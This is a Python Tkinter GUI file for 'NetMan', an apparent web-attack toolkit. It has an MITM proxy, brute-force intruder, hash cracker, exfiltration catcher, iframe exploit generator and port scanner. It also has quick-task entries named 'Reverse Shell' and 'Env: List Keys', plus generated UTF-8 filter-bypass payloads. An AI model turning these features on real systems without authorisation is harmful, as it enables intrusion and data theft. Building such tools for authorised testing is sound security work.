#gui_test
import tkinter as tk
from tkinter import ttk
from tkinter import filedialog
from tkinter import messagebox
import os
import socket
import queue
import threading
import intruder_engine
import cracker_engine
import mitm_proxy
import re
import json
import ssl
import http_utils
import base64
from urllib import parse
import html
import browser
from scanner_engine import run_scan
import decoder_engine
import repeater_engine
import logger_engine
import interceptor_engine
import jwt_gui
import discovery_gui
import subprocess
import crawler_gui
import scraper_gui
import vuln_gui
import xss_gui
import api_gui
import idor_gui
import ai_gui
import ai_engine
import project_engine
import reporter_engine
import ssl_gui
import ws_gui
import tech_gui
import subdomain_gui
import auth_gui
import compliance_gui
import skimmer_engine
import agent_engine
from html.parser import HTMLParser


class _HtmlTextParser(HTMLParser):
    """Minimal HTML-to-Text-widget parser."""
    BLOCK_TAGS = {'p', 'div', 'br', 'tr', 'li', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
                  'table', 'blockquote', 'ul', 'ol', 'hr', 'thead', 'tbody'}
    SKIP_TAGS  = {'script', 'style', 'head', 'noscript', 'svg'}

    def __init__(self, text_widget):
        super().__init__(convert_charrefs=True)
        self._w = text_widget
        self._skip = 0
        self._stack = []

    def _active_tags(self):
        tags = []
        for t in self._stack:
            if t in ('b', 'strong', 'th'):         tags.append('bold')
            elif t in ('i', 'em', 'cite'):          tags.append('italic')
            elif t in ('code', 'pre', 'kbd', 'samp'): tags.append('code')
            elif t == 'h1':                         tags.append('h1')
            elif t == 'h2':                         tags.append('h2')
            elif t == 'h3':                         tags.append('h3')
            elif t == 'a':                          tags.append('link')
        return tuple(dict.fromkeys(tags))

    def handle_starttag(self, tag, attrs):
        if tag in self.SKIP_TAGS:
            self._skip += 1
            return
        self._stack.append(tag)
        if tag in self.BLOCK_TAGS:
            if self._w.get('end-2c', 'end-1c') != '\n':
                self._w.insert(tk.END, '\n')
        if tag == 'hr':
            self._w.insert(tk.END, '\u2500' * 60 + '\n')

    def handle_endtag(self, tag):
        if tag in self.SKIP_TAGS:
            self._skip = max(0, self._skip - 1)
            return
        if tag in self._stack:
            while self._stack and self._stack[-1] != tag:
                self._stack.pop()
            if self._stack:
                self._stack.pop()
        if tag in self.BLOCK_TAGS:
            if self._w.get('end-2c', 'end-1c') != '\n':
                self._w.insert(tk.END, '\n')

    def handle_data(self, data):
        if self._skip > 0:
            return
        if 'pre' not in self._stack:
            data = re.sub(r'[\t ]+', ' ', data)
            if not data.strip():
                return
        self._w.insert(tk.END, data, self._active_tags())


class SimpleHtmlRenderer(tk.Frame):
    """Pure-Tk HTML renderer; no external dependencies."""
    def __init__(self, master, **kw):
        super().__init__(master, **kw)
        sb = tk.Scrollbar(self)
        sb.pack(side=tk.RIGHT, fill=tk.Y)
        self._text = tk.Text(self, wrap=tk.WORD, yscrollcommand=sb.set,
                             font=('Arial', 10), padx=8, pady=8, state=tk.NORMAL)
        self._text.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)
        sb.config(command=self._text.yview)
        self._text.tag_config('bold',   font=('Arial', 11, 'bold'))
        self._text.tag_config('italic', font=('Arial', 10, 'italic'))
        self._text.tag_config('code',   font=('Courier', 9), background='#f0f0f0')
        self._text.tag_config('h1',     font=('Arial', 16, 'bold'))
        self._text.tag_config('h2',     font=('Arial', 14, 'bold'))
        self._text.tag_config('h3',     font=('Arial', 12, 'bold'))
        self._text.tag_config('link',   foreground='blue', underline=True)

    def load_html(self, html_content):
        self._text.config(state=tk.NORMAL)
        self._text.delete('1.0', tk.END)
        try:
            _HtmlTextParser(self._text).feed(html_content)
        except Exception:
            self._text.insert(tk.END, html_content)
        self._text.config(state=tk.DISABLED)


# --- Autonomous agent (singleton) ---
agent = agent_engine.NetManAgent()

current_dir = os.path.dirname(os.path.abspath(__file__))
history_file_path = os.path.join(current_dir, "http_history.log")
active_scope = ""
current_target_os = "Unknown"
listen_global_var = None
intruder_response_db = {}
_oob_host = os.getenv("NGROK_DOMAIN", "YOUR_NGROK_DOMAIN")

QUICK_TASKS = {
    "Select Task...": "",
    "Env: List Keys": "ENV_KEYS_CMD",
    "FS: Read File": "READ_FILE_CMD",
    "Python: Reverse Shell": "REV_SHELL_CMD",
    "Python: WhoAmI": "import os; print(os.getlogin())",
    "Python: List Dirs": "import os; print(os.listdir('.'))",
    "JS: Node Version": "process.version",
    "JS: List Files": "require('fs').readdirSync('.').join(', ')"
}

def b64_encode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.encode_base64(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def b64_decode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.decode_base64(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def b85_encode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.encode_base85(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def b85_decode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.decode_base85(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def url_encode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.encode_url(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def url_decode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.decode_url(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def html_encode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.encode_html(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def html_decode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.decode_html(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def hex_encode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.encode_hex(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def hex_decode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.decode_hex(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def bin_encode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.encode_binary(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def bin_decode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.decode_binary(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def smart_decode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    if re.search(r'%[0-9a-fA-F]{2}', raw_text):
        url_decode_text()
    elif re.search(r'&[a-zA-Z0-9#]+;', raw_text):
        html_decode_text()
    elif re.match(r'^[a-fA-F0-9]{32}$', raw_text):
        decoder_output.delete("1.0", tk.END)
        decoder_output.insert("1.0", "[-] This looks like an MD5 Hash. Right-click and 'Send to Cracker'.")
    elif re.match(r'^[A-Za-z0-9+/]+={0,2}$', raw_text):
        b64_decode_text()
    else:
        decoder_output.delete("1.0", tk.END)
        decoder_output.insert("1.0", "[-] Auto-detect failed. Please use a manual decoding button.")
                              
def load_selected_payload(event):
    selected_name = payload_dropdown.get()
    actual_payload = common_payloads.get(selected_name, "")
    exploit_payload_entry.delete(0, tk.END)
    exploit_payload_entry.insert(0, actual_payload)

def load_project_dialog():
    file_path = filedialog.askopenfilename(filetypes=[("NetMan Project", "*.nman")])
    if not file_path:
        return
        
    project_data, message = project_engine.load_project(file_path)
    if not project_data:
        messagebox.showerror("Load Failed", f"Could not load project: {message}")
        return

    global active_scope
    active_scope = project_data.get("scope", "")
    mitm_proxy.set_scope(active_scope)
    scope_entry.delete(0, tk.END)
    scope_entry.insert(0, active_scope)

    logger_engine.clear_log(history_file_path)
    logger_engine.append_log(history_file_path, project_data.get("history", ""))
    refresh_history()
    messagebox.showinfo("Success", message)

def get_current_skimmer_hits():
    hits = set()
    for item in intruder_results.get_children():
        vals = intruder_results.item(item)['values']
        if len(vals) > 6:
            hit_text = vals[6]
            if hit_text and hit_text not in ["None", "N/A"]:
                for sub_hit in hit_text.split(", "):
                    hits.add(sub_hit)
    return sorted(list(hits))

def preview_report():
    import reporter_engine
    import ai_gui
    
    hits = get_current_skimmer_hits()
    insights = ai_gui.ai_output.get("1.0", tk.END).strip()
    
    report_text = reporter_engine.generate_report_text(active_scope, hits, insights)
    
    preview_win = tk.Toplevel(app)
    preview_win.title("Report Preview")
    preview_win.geometry("700x600")
    
    txt = tk.Text(preview_win, padx=15, pady=15, font=("Consolas", 10))
    txt.insert("1.0", report_text)
    txt.config(state="disabled")
    txt.pack(fill=tk.BOTH, expand=True)
    
    close_btn = tk.Button(preview_win, text="Close Preview", command=preview_win.destroy, pady=5)
    close_btn.pack(fill=tk.X)

def export_report_dialog():
    import reporter_engine
    import ai_gui
    
    file_path = filedialog.asksaveasfilename(defaultextension=".md", filetypes=[("Markdown", "*.md")])
    if not file_path:
        return
        
    hits = get_current_skimmer_hits()
    insights = ai_gui.ai_output.get("1.0", tk.END).strip()
    report_text = reporter_engine.generate_report_text(active_scope, hits, insights)
    
    success, message = reporter_engine.save_report(file_path, report_text)
    if success:
        messagebox.showinfo("Success", message)
    else:
        messagebox.showerror("Export Failed", f"Could not export report: {message}")

def new_project_trigger():
    global active_scope
    active_scope = ""
    mitm_proxy.set_scope("")
    scope_entry.delete(0, tk.END)
    logger_engine.clear_log(history_file_path)
    refresh_history()

def copy_exploit_to_clipboard():
    content = exploit_output.get("1.0", tk.END).strip()
    if content:
        app.clipboard_clear()
        app.clipboard_append(content)
        # Visual feedback: temporarily change button text
        exploit_copy_btn.config(text="Copied!", bg="gray")
        app.after(1000, lambda: exploit_copy_btn.config(text="Copy to Clipboard", bg="darkblue"))

def generate_iframe():
    url = exploit_url_entry.get().strip()
    raw_payload = exploit_payload_entry.get().strip()
    encoding = transform_var.get()
    comment_style = comment_style_var.get()
    
    if not url:
        return
    if comment_style == "#":
        raw_payload = raw_payload.replace("--", "#")
    if encoding == "Base64":
        final_payload = base64.b64encode(raw_payload.encode()).decode()
    elif encoding == "MD5 Hash":
        import hashlib
        final_payload = hashlib.md5(raw_payload.encode()).hexdigest()
    else:
        final_payload = parse.quote(raw_payload, safe='/:?=&#')
    if not url.startswith("http"):
        url = "https://" + url
        
    full_target = f"{url}{final_payload}"
    iframe_code = f"<iframe src=\"{full_target}\" width='500' height='300'></iframe>"
    exploit_output.delete("1.0", tk.END)
    exploit_output.insert("1.0", iframe_code)

def save_project_dialog():
    file_path = filedialog.asksaveasfilename(defaultextension=".nman", filetypes=[("NetMan Project", "*.nman")])
    if not file_path:
        return
        
    history_data = logger_engine.read_log(history_file_path)
    
    project_payload = {
        "scope": active_scope,
        "history": history_data
    }
    
    import project_engine
    success, message = project_engine.save_project(file_path, project_payload)
    if success:
        messagebox.showinfo("Success", message)
    else:
        messagebox.showerror("Save Failed", f"Could not save project: {message}")

def start_port_scan():
    target_ip = scanner_target_entry.get().strip()
    raw_ports = scanner_ports_entry.get().strip()
    raw_timeout = scanner_timeout_entry.get().strip()
    if not target_ip or not raw_ports:
        scanner_output.insert(tk.END, "Error: Target IP and Ports are required.\n")
        return
    scanner_output.delete("1.0", tk.END)
    scanner_output.insert(tk.END, f"Initiating scan on {target_ip}...\n\n")
    scanner_btn.config(state="disabled")
    def worker():
        try:
            results = run_scan(target_ip, raw_ports, float(raw_timeout))
            if results:
                message = f"\n[+] Open Ports found: {results}\nScan Complete.\n"
            else:
                message = "\n[-] No Open Ports Found.\nScan Complete.\n"
            app.after(0, lambda: scanner_output.insert(tk.END, message))
        except Exception as e:
            app.after(0, lambda: scanner_output.insert(tk.END, f"\nError: {e}\n"))
        finally:
            app.after(0, lambda: scanner_btn.config(state="normal"))
    threading.Thread(target=worker, daemon=True).start()    

def on_app_close():
    app.destroy()

app = tk.Tk()
listen_global_var = tk.BooleanVar(value=False)
right_click_menu = tk.Menu(app, tearoff=0)
right_click_menu.add_command(label="Copy", command=lambda: (fw := app.focus_get()) and fw.event_generate("<<Copy>>"))
right_click_menu.add_command(label="Paste", command=lambda: (fw := app.focus_get()) and fw.event_generate("<<Paste>>"))
right_click_menu.add_separator()
right_click_menu.add_command(label="Send to Repeater", command=lambda: send_to_repeater(app.focus_get()))
right_click_menu.add_command(label="Send to Intruder", command=lambda: send_to_intruder(app.focus_get()))
right_click_menu.add_command(label="Send to Decoder", command=lambda: send_to_decoder(app.focus_get()))
right_click_menu.add_command(label="Send to Cracker", command=lambda: send_to_cracker(app.focus_get()))
right_click_menu.add_command(label="Send to AI", command=lambda: send_to_ai(app.focus_get()))

def show_right_click_menu(event):
    try:
        event.widget.focus_set()
        right_click_menu.tk_popup(event.x_root, event.y_root)
    finally:
        right_click_menu.grab_release()

app.bind_class("Text", "<Button-3>", show_right_click_menu)
app.bind_class("Entry", "<Button-3>", show_right_click_menu)

app.title("NetMan")
app.geometry("1000x700")
app.minsize(1000, 680)
app.resizable(True, True)
main_menu = tk.Menu(app)
app.config(menu=main_menu)

file_menu = tk.Menu(main_menu, tearoff=0)
main_menu.add_cascade(label="Project", menu=file_menu)
file_menu.add_command(label="New Project", command=new_project_trigger)
file_menu.add_command(label="Save Project As...", command=save_project_dialog)
file_menu.add_command(label="Load Project...", command=load_project_dialog)
file_menu.add_separator()
file_menu.add_command(label="Preview Report", command=preview_report)
file_menu.add_command(label="Export Report (.md)", command=export_report_dialog)
file_menu.add_separator()
file_menu.add_command(label="Exit", command=on_app_close)

tab_control = ttk.Notebook(app)

history_tab = ttk.Frame(tab_control)
repeater_tab = ttk.Frame(tab_control)
intruder_tab = ttk.Frame(tab_control)
decoder_tab = ttk.Frame(tab_control)
cracker_tab = ttk.Frame(tab_control)
exfil_tab = ttk.Frame(tab_control)
exploit_tab = ttk.Frame(tab_control)
scanner_tab = ttk.Frame(tab_control)
intercept_tab = ttk.Frame(tab_control)

tab_control.add(history_tab, text="HTTP History")
tab_control.add(repeater_tab, text="Repeater")
tab_control.add(intruder_tab, text="Intruder")
tab_control.add(decoder_tab, text="Decoder")
tab_control.add(cracker_tab, text="Cracker")
tab_control.add(exfil_tab, text="Exfil Catcher")
tab_control.add(exploit_tab, text="Exploit Gen")
tab_control.add(scanner_tab, text="Port Scanner")
tab_control.add(intercept_tab, text="Interceptor")
jwt_gui.build_jwt_tab(tab_control)
discovery_gui.build_discovery_tab(tab_control)
crawler_gui.build_crawler_tab(tab_control)
scraper_gui.build_scraper_tab(tab_control)
vuln_gui.build_vuln_tab(tab_control)
xss_gui.build_xss_tab(tab_control)
api_gui.build_api_tab(tab_control)
idor_gui.build_idor_tab(tab_control)
ai_tab = ai_gui.build_ai_tab(tab_control)
ssl_gui.build_ssl_tab(tab_control)
ws_gui.build_ws_tab(tab_control)
tech_gui.build_tech_tab(tab_control)
subdomain_gui.build_subdomain_tab(tab_control)
auth_gui.build_auth_tab(tab_control)
compliance_gui.build_compliance_tab(tab_control)

decoder_pane = tk.PanedWindow(decoder_tab, orient=tk.VERTICAL)
decoder_pane.pack(expand=1, fill="both")

decoder_input = tk.Text(decoder_pane, height=10)
decoder_pane.add(decoder_input)

decoder_controls = tk.Frame(decoder_pane)
decoder_pane.add(decoder_controls)

smart_decode_btn = tk.Button(decoder_controls, text="Smart Decode (Auto)", command=smart_decode_text, bg="lightblue")
smart_decode_btn.pack(side=tk.LEFT, padx=5, pady=5)

btn_b64_encode = tk.Button(decoder_controls, text="Base64 Encode", command=b64_encode_text)
btn_b64_encode.pack(side=tk.LEFT, padx=5, pady=5)

btn_b64_decode = tk.Button(decoder_controls, text="Base64 Decode", command=b64_decode_text)
btn_b64_decode.pack(side=tk.LEFT, padx=5, pady=5)

btn_b85_encode = tk.Button(decoder_controls, text="Base85 Encode", command=b85_encode_text)
btn_b85_encode.pack(side=tk.LEFT, padx=5, pady=5)

btn_b85_decode = tk.Button(decoder_controls, text="Base85 Decode", command=b85_decode_text)
btn_b85_decode.pack(side=tk.LEFT, padx=5, pady=5)

btn_url_encode = tk.Button(decoder_controls, text="URL Encode", command=url_encode_text)
btn_url_encode.pack(side=tk.LEFT, padx=5, pady=5)

btn_url_decode = tk.Button(decoder_controls, text="URL Decode", command=url_decode_text)
btn_url_decode.pack(side=tk.LEFT, padx=5, pady=5)

btn_html_encode = tk.Button(decoder_controls, text="HTML Encode", command=html_encode_text)
btn_html_encode.pack(side=tk.LEFT, padx=5, pady=5)

btn_html_decode = tk.Button(decoder_controls, text="HTML Decode", command=html_decode_text)
btn_html_decode.pack(side=tk.LEFT, padx=5, pady=5)

btn_hex_encode = tk.Button(decoder_controls, text="Hex Encode", command=hex_encode_text)
btn_hex_encode.pack(side=tk.LEFT, padx=5, pady=5)

btn_hex_decode = tk.Button(decoder_controls, text="Hex Decode", command=hex_decode_text)
btn_hex_decode.pack(side=tk.LEFT, padx=5, pady=5)

btn_bin_encode = tk.Button(decoder_controls, text="Binary Encode", command=bin_encode_text)
btn_bin_encode.pack(side=tk.LEFT, padx=5, pady=5)

btn_bin_decode = tk.Button(decoder_controls, text="Binary Decode", command=bin_decode_text)
btn_bin_decode.pack(side=tk.LEFT, padx=5, pady=5)

decoder_output = tk.Text(decoder_pane, height=10)
decoder_pane.add(decoder_output)

tab_control.pack(expand=1, fill="both")

def toggle_intercept():
    is_now_enabled = interceptor_engine.toggle()
    if is_now_enabled:
        intercept_btn.config(text="Intercept is On", bg="orange")
    else:
        intercept_btn.config(text="Intercept is Off", bg="lightgray")

def forward_request():
    edited_data = intercept_text.get("1.0", "end-1c")
    interceptor_engine.forward_request(edited_data)

def drop_request():
    interceptor_engine.drop_request()
    intercept_text.delete("1.0", tk.END)

_history_shown_count = 0

def _parse_history_entries(content):
    requests = content.split("==========\n")
    entries = []
    for req in requests:
        req = req.strip()
        if not req:
            continue
        lines = req.split('\n')
        first_line = next((l for l in lines if l and not l.startswith('[TARGET:')), "")
        method = first_line.split(' ')[0] if first_line else "N/A"
        host = "Unknown"
        for line in lines:
            if line.lower().startswith("host:"):
                host = line.split(":", 1)[1].strip()
                break
        entries.append((method, host, len(req)))
    return entries

def refresh_history():
    global _history_shown_count
    for item in history_tree.get_children():
        history_tree.delete(item)
    _history_shown_count = 0
    if not os.path.exists(history_file_path):
        return
    with open(history_file_path, "r", encoding="utf-8") as f:
        content = f.read()
    for method, host, length in _parse_history_entries(content):
        _history_shown_count += 1
        history_tree.insert('', 'end', values=(_history_shown_count, method, host, length))

def _poll_new_history():
    """Append only new rows — never clears the tree so selection/focus is preserved."""
    global _history_shown_count
    if not os.path.exists(history_file_path):
        return
    with open(history_file_path, "r", encoding="utf-8") as f:
        content = f.read()
    entries = _parse_history_entries(content)
    for method, host, length in entries[_history_shown_count:]:
        _history_shown_count += 1
        history_tree.insert('', 'end', values=(_history_shown_count, method, host, length))

def launch_proxy_thread():
    if proxy_btn.cget("text") == "Start MITM Proxy":
        is_global = listen_global_var.get() if listen_global_var is not None else False
        proxy_thread = threading.Thread(target=mitm_proxy.start_proxy, args=(8080, is_global), daemon=True)
        proxy_thread.start()
        proxy_btn.config(text="Stop MITM Proxy", bg="red")
        browser.launch_firefox()
    else:
        mitm_proxy.stop_proxy()
        proxy_btn.config(text="Start MITM Proxy", bg="darkred", fg="white")

def view_request(event):
    selected = history_tree.selection()
    if not selected:
        return
    item = history_tree.item(selected[0])
    req_id = int(item['values'][0])

    with open(history_file_path, "r", encoding="utf-8") as f:
        content = f.read()
    requests = content.split("\n==========\n")
    valid_requests = [req.strip() for req in requests if req.strip()]
    if req_id <= len(valid_requests):
        raw_req = valid_requests[req_id - 1]
        history_text.delete("1.0", tk.END)
        history_text.insert("1.0", raw_req)
        history_text.update_idletasks()

def sort_column(tree, col, reverse):
    data_list = [(tree.set(child, col), child) for child in tree.get_children('')]
    try:
        data_list.sort(key=lambda x: int(x[0]), reverse=reverse)
    except ValueError:
        data_list.sort(reverse=reverse)
    for index, (val, child) in enumerate(data_list):
        tree.move(child, '', index)
    tree.heading(col, command=lambda: sort_column(tree, col, not reverse))

def auto_format_request():
    req = intruder_text.get("1.0", tk.END).strip()
    formatted_req = http_utils.format_http_request(req)
    intruder_text.delete("1.0", tk.END)
    intruder_text.insert("1.0", formatted_req)

def auto_format_repeater():
    req = repeater_text.get("1.0", tk.END).strip()
    formatted_req = http_utils.format_http_request(req)
    repeater_text.delete("1.0", tk.END)
    repeater_text.insert("1.0", formatted_req)

def open_payload_generator(target_entry, list_id):
    gen_win = tk.Toplevel(app)
    gen_win.title("Payload Generator")
    gen_win.geometry("400x350")

    tk.Label(gen_win, text="Payload Type:").pack(pady=5)
    gen_type = tk.StringVar(value="Numbers")
    type_menu = ttk.Combobox(gen_win, textvariable=gen_type, values=["Numbers", "Brute Force"], state="readonly")
    type_menu.pack(pady=5)

    block_frame = tk.Frame(gen_win)
    tk.Label(block_frame, text="Base Character:").grid(row=0, column=0)
    base_char = tk.Entry(block_frame, width=5)
    base_char.insert(0, "A")
    base_char.grid(row=0, column=1)

    tk.Label(block_frame, text="Min Count:").grid(row=1, column=0)
    min_count = tk.Entry(block_frame, width=10)
    min_count.insert(0, "1")
    min_count.grid(row=1, column=1)

    tk.Label(block_frame, text="Max Count:").grid(row=2, column=0)
    max_count = tk.Entry(block_frame, width=10)
    max_count.insert(0, "10")
    max_count.grid(row=2, column=1)

    num_frame = tk.Frame(gen_win)
    tk.Label(num_frame, text="From:").grid(row=0, column=0)
    start_num = tk.Entry(num_frame, width=10)
    start_num.insert(0, "1")
    start_num.grid(row=0, column=1)

    tk.Label(num_frame, text="To:").grid(row=1, column=0)
    end_num = tk.Entry(num_frame, width=10)
    end_num.insert(0, "100")
    end_num.grid(row=1, column=1)

    tk.Label(num_frame, text="Step:").grid(row=2, column=0)
    step_num = tk.Entry(num_frame, width=10)
    step_num.insert(0, "1")
    step_num.grid(row=2, column=1)

    tk.Label(num_frame, text="Zero-pad to digits:").grid(row=3, column=0, sticky="e", pady=(6, 0))
    pad_width_var = tk.StringVar(value="None")
    pad_width_menu = ttk.Combobox(num_frame, textvariable=pad_width_var,
                                   values=["None", "1  (1)", "2  (01)", "3  (001)", "4  (0001)", "5  (00001)", "6  (000001)"],
                                   state="readonly", width=14)
    pad_width_menu.grid(row=3, column=1, sticky="w", pady=(6, 0))

    brute_frame = tk.Frame(gen_win)
    tk.Label(brute_frame, text="Charset:").grid(row=0, column=0)
    charset_entry = tk.Entry(brute_frame, width=30)
    charset_entry.insert(0, "abcdefghijklmnopqrstuvwxyz0123456789")
    charset_entry.grid(row=0, column=1)

    type_menu = ttk.Combobox(gen_win, textvariable=gen_type, values=["Numbers", "Brute Force", "Character Blocks", "Bypass/UTF-8"], state="readonly")
    type_menu.pack(pady=5)

    bypass_frame = tk.Frame(gen_win)
    tk.Label(bypass_frame, text="Character to Bypass:").grid(row=0, column=0)
    bypass_char = tk.Entry(bypass_frame, width=5)
    bypass_char.insert(0, "'")
    bypass_char.grid(row=0, column=1)

    def fill_full_ascii():
        printable_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ "
        charset_entry.delete(0, tk.END)
        charset_entry.insert(0, printable_chars)

    tk.Button(brute_frame, text="Full ASCII", command=fill_full_ascii).grid(row=0, column=2, padx=5)

    tk.Label(brute_frame, text="Min Length:").grid(row=1, column=0)
    min_len = tk.Entry(brute_frame, width=5)
    min_len.insert(0, "1")
    min_len.grid(row=1, column=1)

    tk.Label(brute_frame, text="Max Length:").grid(row=2, column=0)
    max_len = tk.Entry(brute_frame, width=5)
    max_len.insert(0, "3")
    max_len.grid(row=2, column=1)

    def toggle_frames(event=None):
        num_frame.pack_forget()
        brute_frame.pack_forget()
        block_frame.pack_forget()
        if gen_type.get() == "Numbers":
            num_frame.pack(pady=10)
        elif gen_type.get() =="Brute Force":
            brute_frame.pack(pady=10)
        elif gen_type.get() == "Character Blocks":
            block_frame.pack(pady=10)
        else:
            bypass_frame.pack(pady=10)


    type_menu.bind("<<ComboboxSelected>>", toggle_frames)
    toggle_frames()

    import itertools

    def run_gen():
        payloads = []
        if gen_type.get() == "Numbers":
            s = int(start_num.get())
            e = int(end_num.get())
            step = int(step_num.get())
            pad_sel = pad_width_var.get()
            pad_digits = 0 if pad_sel == "None" else int(pad_sel[0])
            if pad_digits > 0:
                payloads = [str(i).zfill(pad_digits) for i in range(s, e + 1, step)]
            else:
                payloads = [str(i) for i in range(s, e + 1, step)]
        elif gen_type.get() == "Brute Force":
            chars = charset_entry.get()
            low = int(min_len.get())
            high = int(max_len.get())
            for length in range(low, high + 1):
                for item in itertools.product(chars, repeat=length):
                    payloads.append("".join(item))
        elif gen_type.get() == "Bypass/UTF-8":
            char = bypass_char.get()
            if char == "'":
                payloads = ["%C0%A7", "%E0%80%A7", "%F0%80%80%A7"]
            elif char == "\"":
                payloads = ["%C0%A2", "%E0%80%A2", "%F0%80%80%A2"]
            elif char == "<":
                payloads = ["%C0%BC", "%E0%80%BC", "%F0%80%80%BC"]
            else:
                payloads = [f"No preset for {char}"]
        else:
            char = base_char.get()
            low = int(min_count.get())
            high = int(max_count.get())
            for count in range(low, high + 1):
                payloads.append(char * count)
        file_name = f"gen_payloads_{list_id}.txt"
        file_path = os.path.join(os.getcwd(), file_name).replace('\\', '/')
        with open(file_path, "w") as f:
            f.write("\n".join(payloads))
        
        target_entry.delete(0, tk.END)
        target_entry.insert(0, file_path)
        gen_win.destroy()

    tk.Button(gen_win, text="Generate & Apply", bg="green", fg="white", command=run_gen).pack(pady=20)

def start_intruder_attack():
    for item in intruder_results.get_children():
        intruder_results.delete(item)
        intruder_response_db.clear()
    skimmer_engine.reset_findings()
    host = intruder_host.get().strip()
    port = intruder_port.get().strip()
    template = intruder_text.get("1.0", tk.END).strip()
    wordlist_path = intruder_wordlist.get().strip()
    wordlist2_path = intruder_wordlist2.get().strip()
    attack_type = attack_type_var.get()
    match_str = intruder_match.get().strip()
    rule1 = get_rules1()
    rule2 = get_rules2()
    try:
        delay_ms = int(intruder_delay.get().strip())
    except ValueError:
        delay_ms = 0
    try:
        target_threads = int(intruder_threads.get().strip())
    except ValueError:
        target_threads = 10
    macro_req_val = intruder_macro_req.get("1.0", tk.END).strip()
    macro_reg_val = intruder_macro_reg.get().strip()
    progress_var.set(0)
    
    spoof_headers = [name for name, var in _spoof_header_vars.items() if var.get()]
    attack_thread = threading.Thread(
    target=intruder_engine.run_attack_loop,
    args=(host, port, template, attack_type, wordlist_path, wordlist2_path, match_str, progress_var, rule1, rule2, delay_ms, macro_req_val, macro_reg_val, target_threads, spoof_headers),
        daemon=True
        )
    attack_thread.start()

def toggle_intruder_attack():
    if intruder_engine.is_running:
        intruder_engine.stop_attack()
        intruder_attack_btn.config(text="Start Attack", bg="darkred")
    else:
        start_intruder_attack()
        intruder_attack_btn.config(text="Stop Attack", bg="#8B0000")

def view_intruder_response(event):
    selected_resp = intruder_results.selection()
    if not selected_resp:
        return
    item_id = selected_resp[0]
    full_text = intruder_response_db.get(item_id, "Response data not found")
    intruder_response_text.delete("1.0", tk.END)
    intruder_response_text.insert(tk.END, full_text)
    intruder_bottom_notebook.select(response_tab)

def search_intruder_response():
    intruder_response_text.tag_remove("match", "1.0", tk.END)
    search_query = intruder_search_entry.get().strip()
    if not search_query:
        return
    start_pos = "1.0"
    while True:
        start_pos = intruder_response_text.search(search_query, start_pos, stopindex=tk.END)
        if not start_pos:
            break
        end_pos = f"{start_pos}+{len(search_query)}c"
        intruder_response_text.tag_add("match", start_pos, end_pos)
        start_pos = end_pos
    intruder_response_text.tag_config("match", background="yellow", foreground="black")

def send_to_intruder(source_widget=None):
    try:
        if source_widget is None:
            source_widget = history_text
        captured_request = source_widget.get(tk.SEL_FIRST, tk.SEL_LAST)
        intruder_text.delete("1.0", tk.END)
        intruder_text.insert(tk.END, captured_request)
        for line in captured_request.split('\n'):
            if line.strip().lower().startswith("host:"):
                target = line.split(':', 1)[1].strip()
                if ':' in target:
                    host_only = target.split(':')[0]
                    port_only = target.split(':')[1]
                    intruder_host.delete(0, tk.END)
                    intruder_host.insert(0, host_only)
                    intruder_port.delete(0, tk.END)
                    intruder_port.insert(0, port_only)
                else:
                    intruder_host.delete(0, tk.END)
                    intruder_host.insert(0, target)
                    intruder_port.delete(0, tk.END)
                    intruder_port.insert(0, "443")
                break
        tab_control.select(intruder_tab)
    except tk.TclError:
        print('[-] Whoops! Please highlight a request in the history first')

def quick_url_encode(event):
    widget = event.widget
    try:
        start = widget.index("sel.first")
        end = widget.index("sel.last")
        raw_text = widget.get(start, end)
        encoded_text = parse.quote(raw_text, safe='/^')
        widget.delete(start, end)
        widget.insert(start, encoded_text)
    except tk.TclError:
        pass
    return "break"

def quick_url_decode(event):
    widget = event.widget
    try:
        start = widget.index("sel.first")
        end = widget.index("sel.last")
        raw_text = widget.get(start, end)
        
        decoded_text = parse.unquote(raw_text)
        
        widget.delete(start, end)
        widget.insert(start, decoded_text)
    except tk.TclError:
        pass
    return "break"

def quick_b64_encode(event):
    widget = event.widget
    try:
        start = widget.index("sel.first")
        end = widget.index("sel.last")
        raw_text = widget.get(start, end)
        encoded_text = decoder_engine.encode_base64(raw_text)
        widget.delete(start, end)
